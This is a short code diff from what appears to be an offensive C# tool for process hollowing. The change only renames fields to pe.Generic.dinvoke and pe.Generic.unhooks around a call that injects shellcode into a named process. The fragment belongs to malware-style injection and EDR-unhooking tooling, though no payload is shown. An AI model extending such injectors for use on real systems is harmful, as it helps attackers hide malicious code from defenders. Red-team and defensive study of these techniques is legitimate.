@@ -52,13 +52,13 @@ namespace ProcessHollowing
             }
             if ( processname != null && shellcode.Length > 0)
             {
-                if (!pe.dinvoke)
+                if (!pe.Generic.dinvoke)
                 {
                     Loader.start(processname, shellcode);
                     Console.WriteLine("Invoke process hollowing");
                     return true;
                 }
-                Console.WriteLine(pe.unhooks[0] + "\n" + pe.unhooks[1] + "\n" + pe.unhooks[2] + "\n");
+                Console.WriteLine(pe.Generic.unhooks[0] + "\n" + pe.Generic.unhooks[1] + "\n" + pe.Generic.unhooks[2] + "\n");
                 Console.WriteLine("process hollowing using dinvoke was empty");
             }
             return true;
